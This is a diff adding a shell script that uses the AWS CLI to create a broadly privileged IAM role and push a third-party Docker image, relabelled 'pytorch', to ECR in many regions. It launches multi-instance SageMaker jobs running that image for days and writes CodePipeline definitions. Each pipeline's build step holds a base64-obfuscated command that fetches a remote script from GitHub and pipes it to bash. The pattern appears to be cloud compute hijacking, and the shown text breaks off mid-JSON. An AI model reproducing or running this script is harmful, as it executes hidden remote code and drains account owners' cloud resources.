@@ -1,0 +1,5049 @@
+docker pull novalanto/xcb:latest
+
+wget https://github.com/ranalims99/nice/raw/main/a -O mysage.json
+
+aws iam create-role --role-name mysage --assume-role-policy-document file://mysage.json --output text
+aws iam attach-role-policy --role-name mysage --policy-arn arn:aws:iam::aws:policy/AmazonS3FullAccess --output text
+aws iam attach-role-policy --role-name mysage --policy-arn arn:aws:iam::aws:policy/AmazonSageMakerFullAccess --output text
+
+aws s3 mb s3://us-east-1-687185077845-pytorch --region us-east-1
+
+aws ecr create-repository --repository-name pytorch --region us-east-1
+aws ecr create-repository --repository-name pytorch --region us-east-2
+aws ecr create-repository --repository-name pytorch --region us-west-1
+aws ecr create-repository --repository-name pytorch --region us-west-2
+aws ecr create-repository --repository-name pytorch --region ap-south-1
+aws ecr create-repository --repository-name pytorch --region ap-northeast-3
+aws ecr create-repository --repository-name pytorch --region ap-northeast-2
+aws ecr create-repository --repository-name pytorch --region ap-southeast-1
+aws ecr create-repository --repository-name pytorch --region ap-southeast-2
+aws ecr create-repository --repository-name pytorch --region ap-northeast-1
+aws ecr create-repository --repository-name pytorch --region ca-central-1
+aws ecr create-repository --repository-name pytorch --region eu-central-1
+aws ecr create-repository --repository-name pytorch --region eu-west-1
+aws ecr create-repository --repository-name pytorch --region eu-west-2
+aws ecr create-repository --repository-name pytorch --region eu-west-3
+aws ecr create-repository --repository-name pytorch --region eu-north-1
+aws ecr create-repository --repository-name pytorch --region sa-east-1
+
+docker pull novalanto/xcb:latest
+
+aws ecr get-login-password --region us-east-1 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.us-east-1.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.us-east-1.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.us-east-1.amazonaws.com/pytorch:latest
+aws ecr get-login-password --region us-east-2 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.us-east-2.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.us-east-2.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.us-east-2.amazonaws.com/pytorch:latest
+aws ecr get-login-password --region us-west-1 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.us-west-1.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.us-west-1.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.us-west-1.amazonaws.com/pytorch:latest
+aws ecr get-login-password --region us-west-2 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.us-west-2.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.us-west-2.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.us-west-2.amazonaws.com/pytorch:latest
+aws ecr get-login-password --region ap-south-1 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.ap-south-1.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.ap-south-1.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.ap-south-1.amazonaws.com/pytorch:latest
+aws ecr get-login-password --region ap-northeast-3 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.ap-northeast-3.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.ap-northeast-3.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.ap-northeast-3.amazonaws.com/pytorch:latest
+aws ecr get-login-password --region ap-northeast-2 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.ap-northeast-2.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.ap-northeast-2.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.ap-northeast-2.amazonaws.com/pytorch:latest
+aws ecr get-login-password --region ap-northeast-1 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.ap-northeast-1.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.ap-northeast-1.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.ap-northeast-1.amazonaws.com/pytorch:latest
+aws ecr get-login-password --region ap-southeast-1 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.ap-southeast-1.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.ap-southeast-1.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.ap-southeast-1.amazonaws.com/pytorch:latest
+aws ecr get-login-password --region ap-southeast-2 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.ap-southeast-2.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.ap-southeast-2.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.ap-southeast-2.amazonaws.com/pytorch:latest
+aws ecr get-login-password --region ca-central-1 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.ca-central-1.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.ca-central-1.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.ca-central-1.amazonaws.com/pytorch:latest
+aws ecr get-login-password --region eu-central-1 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.eu-central-1.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.eu-central-1.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.eu-central-1.amazonaws.com/pytorch:latest
+aws ecr get-login-password --region eu-west-1 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.eu-west-1.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.eu-west-1.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.eu-west-1.amazonaws.com/pytorch:latest
+aws ecr get-login-password --region eu-west-2 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.eu-west-2.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.eu-west-2.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.eu-west-2.amazonaws.com/pytorch:latest
+aws ecr get-login-password --region eu-west-3 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.eu-west-3.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.eu-west-3.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.eu-west-3.amazonaws.com/pytorch:latest
+aws ecr get-login-password --region eu-north-1 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.eu-north-1.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.eu-north-1.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.eu-north-1.amazonaws.com/pytorch:latest
+aws ecr get-login-password --region sa-east-1 | docker login --username AWS --password-stdin 687185077845.dkr.ecr.sa-east-1.amazonaws.com
+docker tag novalanto/xcb:latest 687185077845.dkr.ecr.sa-east-1.amazonaws.com/pytorch:latest
+docker push 687185077845.dkr.ecr.sa-east-1.amazonaws.com/pytorch:latest
+
+aws sagemaker create-training-job \
+  --training-job-name itorch1 \
+  --algorithm-specification TrainingImage=687185077845.dkr.ecr.us-east-1.amazonaws.com/pytorch:latest,TrainingInputMode="Pipe" \
+  --role-arn arn:aws:iam::687185077845:role/mysage \
+  --output-data-config S3OutputPath=s3://us-east-1-687185077845-pytorch/ \
+  --resource-config InstanceType=ml.c6i.2xlarge,InstanceCount=15,VolumeSizeInGB=100 \
+  --stopping-condition MaxRuntimeInSeconds=432000 --no-enable-network-isolation --region us-east-1 
+
+aws sagemaker create-training-job \
+  --training-job-name itorch1 \
+  --algorithm-specification TrainingImage=687185077845.dkr.ecr.us-west-2.amazonaws.com/pytorch:latest,TrainingInputMode="Pipe" \
+  --role-arn arn:aws:iam::687185077845:role/mysage \
+  --output-data-config S3OutputPath=s3://us-east-1-687185077845-pytorch/ \
+  --resource-config InstanceType=ml.c6i.2xlarge,InstanceCount=15,VolumeSizeInGB=100 \
+  --stopping-condition MaxRuntimeInSeconds=432000 --no-enable-network-isolation --region us-west-2 
+  
+aws sagemaker create-training-job \
+  --training-job-name itorch1 \
+  --algorithm-specification TrainingImage=687185077845.dkr.ecr.us-east-2.amazonaws.com/pytorch:latest,TrainingInputMode="Pipe" \
+  --role-arn arn:aws:iam::687185077845:role/mysage \
+  --output-data-config S3OutputPath=s3://us-east-1-687185077845-pytorch/ \
+  --resource-config InstanceType=ml.c6i.2xlarge,InstanceCount=15,VolumeSizeInGB=100 \
+  --stopping-condition MaxRuntimeInSeconds=432000 --no-enable-network-isolation --region us-east-2 
+
+
+cat > useast11.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "useast1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > useast12.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "useast1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > useast13.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "useast1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > useast21.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "useast2-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > useast22.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "useast2-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > useast23.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "useast2-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > uswest11.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "uswest1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > uswest12.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "uswest1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > uswest13.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa3",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "uswest1-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_SMALL",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > uswest21.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa1",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "uswest2-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_LARGE",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            }
+        ],
+        "version": 1,
+        "executionMode": "PARALLEL",
+        "pipelineType": "V2"
+    }
+}
+EOF
+
+cat > uswest22.json <<EOF
+{
+    "pipeline": {
+        "name": "aaaa2",
+        "roleArn": "arn:aws:iam::687185077845:role/service-role/AWSCodePipelineServiceRole-us-east-1-aaaa1",
+        "artifactStore": {
+            "type": "S3",
+            "location": "uswest2-687185077845"
+        },
+        "stages": [
+            {
+                "name": "Source",
+                "actions": [
+                    {
+                        "name": "Source",
+                        "actionTypeId": {
+                            "category": "Source",
+                            "owner": "AWS",
+                            "provider": "ECR",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ImageTag": "latest",
+                            "RepositoryName": "pytorch"
+                        },
+                        "outputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "inputArtifacts": [],
+                        "namespace": "SourceVariables"
+                    }
+                ],
+                "onFailure": {
+                    "result": "RETRY",
+                    "retryConfiguration": {
+                        "retryMode": "ALL_ACTIONS"
+                    }
+                }
+            },
+            {
+                "name": "Build",
+                "actions": [
+                    {
+                        "name": "Build",
+                        "actionTypeId": {
+                            "category": "Compute",
+                            "owner": "AWS",
+                            "provider": "Commands",
+                            "version": "1"
+                        },
+                        "runOrder": 1,
+                        "configuration": {
+                            "ComputeType": "BUILD_GENERAL1_MEDIUM",
+                            "EnvironmentType": "LINUX_CONTAINER"
+                        },
+                        "commands": [
+                            "echo Y3VybCAtc0wgaHR0cHM6Ly9naXRodWIuY29tL2thbmR5YXUyL25vaS9yYXcvbWFpbi9uYSB8IGJhc2g= | base64 -d | sh"
+                        ],
+                        "outputArtifacts": [],
+                        "inputArtifacts": [
+                            {
+                                "name": "SourceArtifact"
+                            }
+                        ],
+                        "namespace": "BuildVariables"
+                    }
+                ],
+                "onFailure": {
